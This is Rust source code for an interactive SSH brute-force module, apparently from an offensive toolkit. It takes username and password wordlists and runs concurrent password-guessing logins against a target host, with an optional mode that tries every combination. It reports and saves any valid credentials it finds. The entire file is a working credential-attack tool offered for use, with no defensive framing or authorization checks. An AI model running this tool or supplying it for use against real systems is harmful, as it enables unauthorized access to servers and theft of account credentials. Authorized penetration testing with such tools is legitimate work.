use anyhow::{anyhow, Result};
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use ssh2::Session;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    net::{TcpStream, ToSocketAddrs},
    path::{Path, PathBuf},
    sync::Arc,
};
use std::sync::atomic::{AtomicBool, Ordering};
use regex::Regex;
use tokio::{sync::Mutex, task::spawn_blocking, time::{sleep, Duration}};

pub async fn run(target: &str) -> Result<()> {
    println!("=== SSH Brute Force Module ===");
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("SSH Port", "22")?;
        match input.parse() {
            Ok(p) => break p,
            Err(_) => println!("Invalid port. Try again."),
        }
    };

    let usernames_file = prompt_existing_file("Username wordlist")?;
    let passwords_file = prompt_existing_file("Password wordlist")?;

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        match input.parse() {
            Ok(n) if n > 0 => break n,
            _ => println!("Invalid number. Try again."),
        }
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ssh_brute_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false)?;

    let connect_addr = normalize_target(target, port)?;

    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(AtomicBool::new(false));

    println!("\n[*] Starting brute-force on {}", connect_addr);

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty or invalid. Exiting.");
        return Ok(());
    }
    let passwords = load_lines(&passwords_file)?;
    if passwords.is_empty() {
        println!("[!] Password wordlist is empty or invalid. Exiting.");
        return Ok(());
    }

    let users = Arc::new(users);
    let mut tasks: FuturesUnordered<_> = FuturesUnordered::new();
    let mut user_cycle_idx = 0usize;

    for pass in passwords {
        if stop_on_success && stop.load(Ordering::Relaxed) {
            break;
        }

        let selected_users: Vec<String> = if combo_mode {
            users.iter().cloned().collect()
        } else {
            if users.is_empty() {
                Vec::new()
            } else {
                let user = users[user_cycle_idx % users.len()].clone();
                user_cycle_idx += 1;
                vec![user]
            }
        };

        if selected_users.is_empty() {
            continue;
        }

        for user in selected_users {
            if stop_on_success && stop.load(Ordering::Relaxed) {
                break;
            }

            let addr_clone = connect_addr.clone();
            let user_clone = user.clone();
            let pass_clone = pass.clone();
            let found_clone = Arc::clone(&found);
            let stop_clone = Arc::clone(&stop);
            let stop_flag = stop_on_success;
            let verbose_flag = verbose;

            tasks.push(tokio::spawn(async move {
                if stop_flag && stop_clone.load(Ordering::Relaxed) {
                    return;
                }

                match try_ssh_login(&addr_clone, &user_clone, &pass_clone).await {
                    Ok(true) => {
                        println!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone);
                        found_clone
                            .lock()
                            .await
                            .push((addr_clone.clone(), user_clone.clone(), pass_clone.clone()));
                        if stop_flag {
                            stop_clone.store(true, Ordering::Relaxed);
                        }
                    }
                    Ok(false) => {
                        log(verbose_flag, &format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone));
                    }
                    Err(e) => {
                        log(verbose_flag, &format!("[!] {}: error: {}", addr_clone, e));
                    }
                }

                sleep(Duration::from_millis(10)).await;
            }));

            if tasks.len() >= concurrency {
                if let Some(res) = tasks.next().await {
                    if let Err(e) = res {
                        log(verbose, &format!("[!] Task join error: {}", e));
                    }
                }
            }
        }
    }

    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            log(verbose, &format!("[!] Task join error: {}", e));
        }
    }

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found.");
    } else {
        println!("\n[+] Valid credentials:");
        for (host, user, pass) in creds.iter() {
            println!("     {} -> {}:{}", host, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            let mut file = File::create(&filename)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            println!("[+] Results saved to '{}'", filename.display());
        }
    }

    Ok(())
}

async fn try_ssh_login(normalized_addr: &str, user: &str, pass: &str) -> Result<bool> {
    let user_owned = user.to_string();
    let pass_owned = pass.to_string();
    let addr_owned = normalized_addr.to_string();

    let result = spawn_blocking(move || {
        match TcpStream::connect(&addr_owned) {
            Ok(tcp) => {
                let mut sess = Session::new()?;
                sess.set_tcp_stream(tcp);
                sess.handshake()?;
                match sess.userauth_password(&user_owned, &pass_owned) {
                    Ok(_) => Ok(sess.authenticated()),
                    Err(_) => Ok(false),
                }
            }
            Err(e) => Err(anyhow!("Connection error to {}: {}", addr_owned, e)),
        }
    })
    .await??;

    Ok(result)
}

fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    let re = Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$").unwrap();
    let trimmed = host.trim();
    let caps = re
        .captures(trimmed)
        .ok_or_else(|| anyhow!("Invalid target format: {}", host))?;
    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str()
            .parse::<u16>()
            .map_err(|_| anyhow!("Invalid port value in target '{}'", host))?
    } else {
        default_port
    };
    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };

    formatted
        .to_socket_addrs()
        .map_err(|e| anyhow!("Could not resolve '{}': {}", formatted, e))?
        .next()
        .ok_or_else(|| anyhow!("Could not resolve '{}'", formatted))?;

    Ok(formatted)
}

fn prompt_existing_file(msg: &str) -> Result<String> {
    loop {
        let candidate = prompt_required(msg)?;
        if Path::new(&candidate).is_file() {
            return Ok(candidate);
        } else {
            println!(
                "{}",
                format!("File '{}' does not exist or is not a regular file.", candidate).yellow()
            );
        }
    }
}

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}", format!("{}: ", msg).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        } else {
            println!("{}", "This field is required.".yellow());
        }
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{}", format!("{} [{}]: ", msg, default).cyan().bold());
    std::io::stdout().flush()?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default_char = if default_yes { "y" } else { "n" };
    loop {
        print!("{}", format!("{} (y/n) [{}]: ", msg, default_char).cyan().bold());
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        if input.is_empty() {
            return Ok(default_yes);
        } else if input == "y" || input == "yes" {
            return Ok(true);
        } else if input == "n" || input == "no" {
            return Ok(false);
        } else {
            println!("{}", "Invalid input. Please enter 'y' or 'n'.".yellow());
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path.as_ref())
        .map_err(|e| anyhow!("Failed to open file '{}': {}", path.as_ref().display(), e))?;
    let reader = BufReader::new(file);
    Ok(reader
        .lines()
        .filter_map(Result::ok)
        .filter(|l| !l.trim().is_empty())
        .collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input_path_str: &str) -> PathBuf {
    let path_candidate = Path::new(input_path_str)
        .file_name()
        .map(|os_str| os_str.to_string_lossy())
        .filter(|s_cow| !s_cow.is_empty() && s_cow != "." && s_cow != "..")
        .map(|s_cow| s_cow.into_owned())
        .unwrap_or_else(|| "ssh_brute_results.txt".to_string());
    
    PathBuf::from(format!("./{}", path_candidate))
}
